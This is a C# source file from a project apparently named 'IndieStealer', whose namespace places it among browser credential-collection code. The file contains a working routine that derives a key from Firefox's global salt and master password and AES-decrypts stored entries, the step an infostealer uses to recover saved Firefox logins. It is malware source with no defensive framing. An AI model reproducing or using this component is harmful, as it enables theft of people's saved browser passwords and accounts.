using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace IndieStealer.Collect.Browsers.Gecko.Decrypt
{
    public class MozillaPBE
    {
        private byte[] cipherText { get; set; }
        private byte[] GlobalSalt { get; set; }
        private byte[] MasterPassword { get; set; }
        private byte[] EntrySalt { get; set; }
        public byte[] partIV { get; private set; }

        public MozillaPBE(byte[] cipherText, byte[] GlobalSalt, byte[] MasterPassword, byte[] EntrySalt, byte[] partIV)
        {
            this.cipherText = cipherText;
            this.GlobalSalt = GlobalSalt;
            this.MasterPassword = MasterPassword;
            this.EntrySalt = EntrySalt;
            this.partIV = partIV;
        }

        public byte[] Compute()
        {
            byte[] GLMP;             byte[] HP;             byte[] IV;             byte[] key;             int iterations = 1;
            int keyLength = 32;

            GLMP = new byte[this.GlobalSalt.Length + this.MasterPassword.Length];
            Buffer.BlockCopy(this.GlobalSalt, 0, GLMP, 0, this.GlobalSalt.Length);
            Buffer.BlockCopy(this.MasterPassword, 0, GLMP, this.GlobalSalt.Length, this.MasterPassword.Length);

            HP = new SHA1Managed().ComputeHash(GLMP);

            byte[] ivPrefix = new byte[2] { 0x04, 0x0e };
            IV = new byte[ivPrefix.Length + this.partIV.Length];
            Buffer.BlockCopy(ivPrefix, 0, IV, 0, ivPrefix.Length);
            Buffer.BlockCopy(this.partIV, 0, IV, ivPrefix.Length, this.partIV.Length);
			var df = new Pbkdf2(new HMACSHA256(), HP,this.EntrySalt, iterations);
            key = df.GetBytes(keyLength);

                        Aes aes = new AesManaged
            {
                Mode = CipherMode.CBC,
                BlockSize = 128,
                KeySize = 256,
                Padding = PaddingMode.Zeros,
            };

                        ICryptoTransform AESDecrypt = aes.CreateDecryptor(key, IV);
            var clearText = AESDecrypt.TransformFinalBlock(this.cipherText, 0, this.cipherText.Length);

            return clearText;
        }
    }

}
